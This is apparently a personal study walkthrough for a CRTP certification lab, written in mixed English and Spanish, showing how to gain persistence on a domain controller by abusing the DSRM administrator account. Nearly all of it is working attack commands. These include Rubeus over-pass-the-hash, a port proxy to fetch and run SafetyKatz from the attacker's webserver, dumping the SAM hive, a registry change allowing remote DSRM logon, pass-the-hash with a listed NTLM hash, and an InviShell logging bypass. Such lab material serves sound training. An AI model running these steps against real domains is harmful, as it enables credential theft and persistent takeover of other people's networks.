# Learning Objetive 11

* Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.

***

We can persist with administrative access to the DC once we have Domain Admin privileges by abusing the DSRM administrator.

Start a process with domain admin privileges using the following command:

> Note: Run a administrative privilege cmd

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

> Nota: Resultado: Se abre una nueva ventana de cmd.exe que corre como svcadmin (Domain Admin), con privilegios completos en el dominio, y con el ticket Kerberos inyectado (Over-Pass-the-Hash).

In the spawned process, run the f<mark style="background-color:yellow;">ollowing commands to copy Loader.exe to the DC and extract credentials from the SAM</mark> hive:

## Import Loader & Extract SAM

> It in the new cmd granted

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

Now conectting to the DC and make the pivoting -->

```
winrs -r:dcorp-dc cmd
set username
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.113
```

Now, upload the safetycat to us webserver and do the peticion -->

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```

<figure><img src="../../../../.gitbook/assets/image (62) (1).png" alt=""><figcaption></figcaption></figure>

With it, we dumping the SAM and get the NTML hash of Administrator

| Cuenta                                  | Dónde está el hash | Tipo de cuenta      | Sirve para...                                         | En el lab CRTP                             |
| --------------------------------------- | ------------------ | ------------------- | ----------------------------------------------------- | ------------------------------------------ |
| **Administrator (dominio)**             | NTDS.dit (base AD) | Cuenta de dominio   | Loguearte en cualquier máquina del dominio como DA    | La que usas para DA total (golden, etc.)   |
| **Administrator (DSRM / local del DC)** | SAM local del DC   | Cuenta local del DC | Loguearte **solo** en ese DC cuando está en modo DSRM | La que reseteas y usas para entrar en DSRM |

<mark style="background-color:yellow;">The DSRM administrator is not allowed to logon to the DC from network.</mark>

So, we need to change the logon behavior for the account by modifying registry on the DC.

We can do this as follows:

> All it into the C:\Windows\system32>

```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

<figure><img src="../../../../.gitbook/assets/image (63) (1).png" alt=""><figcaption></figcaption></figure>

> Modificar el registro del DC para permitir logon remoto con DSRM Admin
>
> * **Qué hace**: Cambia el comportamiento del DSRM Administrator para que **pueda loguearse remotamente** (valor 2).
> * **Por qué por defecto no puede**: Microsoft lo bloquea para evitar abuso (solo logon local en DSRM).

<mark style="background-color:yellow;">Now on the student VM</mark>, we can use Pass-The-Hash (not OverPass-The-Hash) for the DSRM administrator:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```

From the new process, we can now access dcorp-dc.

> * **Qué hace**: Usa el NTLM hash del DSRM Administrator para autenticarte remotamente en el DC (PTH) y abre una nueva cmd como ese usuario local.
> * **Por qué PTH y no OPTH**: Es cuenta **local** (no de dominio) → solo NTLM funciona, no Kerberos.

Use it command to get a poweshell commnad line -->

```
powershell -ExecutionPolicy Bypass
```

> Note that we are using PowerShell Remoting with IP address and Authentication - ‘**NegotiateWithImplicitCredential**’ as we are using NTLM authentication. So, we must modify TrustedHosts for the student VM. Run the beklow command from an elevated PowerShell session:

```
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

<figure><img src="../../../../.gitbook/assets/image (64) (1).png" alt=""><figcaption></figcaption></figure>

> * **Qué hace**: Añade la IP del DC a TrustedHosts → permite WinRM con NTLM (sin Kerberos).
> * **Por qué IP y no FQDN**: NTLM no resuelve Kerberos → hay que usar IP.

Now, run the commands below to access the DC:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

<figure><img src="../../../../.gitbook/assets/image (65) (1).png" alt=""><figcaption></figcaption></figure>
